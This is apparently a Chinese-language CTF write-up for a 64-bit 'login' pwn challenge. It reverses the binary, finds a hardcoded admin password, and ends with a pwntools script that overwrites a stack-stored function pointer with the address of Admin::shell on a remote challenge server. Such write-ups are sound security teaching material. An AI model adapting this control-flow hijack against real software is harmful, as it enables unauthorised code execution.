开启了不少保护机制的64位程序



![image-20201216185352364](https://static.hack1s.fun/images/2021/02/06/image-20201216185352364.png)

运行时要输入一个用户名和密码

![image-20201216185409505](https://static.hack1s.fun/images/2021/02/06/image-20201216185409505.png)

IDA64看一下

![image-20201216185535560](https://static.hack1s.fun/images/2021/02/06/image-20201216185535560.png)

应该是C++写的代码，很多都是这样类的方法

这里头写了admin这个账户名，并且看一下这个类初始化时可以发现密码设置成了v10那个字符串

输入这个用户名密码之后得到了一个segment fault

![image-20201216195547873](https://static.hack1s.fun/images/2021/02/06/image-20201216195547873.png)

段错误发生的位置应该是在这个password_checker

![image-20201216201849372](https://static.hack1s.fun/images/2021/02/06/image-20201216201849372.png)

这里看到直接把a1当函数进行调用了，参数s

看汇编代码

![image-20201217170835156](https://static.hack1s.fun/images/2021/02/06/image-20201217170835156.png)

这里实际上是call rax，这里实际上是`rbp+var_68`这个位置

a1是我们调用这个password_checker函数时的第一个参数

因此在调用之前是在rdi中

往前推发现这个位置

![image-20201218144259104](https://static.hack1s.fun/images/2021/02/06/image-20201218144259104.png)

动态调试发现这里有将`rbp+0x130`的值放在rax中，`rax`又放在`rdi`

继续往上可以看到`[rbp+var_130]`这里又是执行完password_checker后rax的值

![image-20201218144542567](https://static.hack1s.fun/images/2021/02/06/image-20201218144542567.png)

在这个函数内部发现rax的值是`[rbp+var_18]`这里控制的

![image-20201218144732229](https://static.hack1s.fun/images/2021/02/06/image-20201218144732229.png)

所以可以尝试将这个地方覆盖成`Admin::shell`的地址

在输入的地方，我们输入到的内容是s

![image-20201218145113099](https://static.hack1s.fun/images/2021/02/06/image-20201218145113099.png)

位置是`rbp-60h`

要覆盖的地方`rbp-18h`

计算一下偏移，再去掉原本密码的长度就可以了

```python
from pwn import *

io = remote('node3.buuoj.cn',25322)
#io = process('./login')
elf = ELF('./login')

admin_shell = 0x400e88

io.recvuntil('username:')
io.sendline('admin')

io.recvuntil('password:')

payload = '2jctf_pa5sw0rd'
payload += (0x60-0x18-len(payload))*'\x00'

payload = bytes(payload,'ascii')  + p64(admin_shell)

io.sendline(payload)
io.interactive()
```

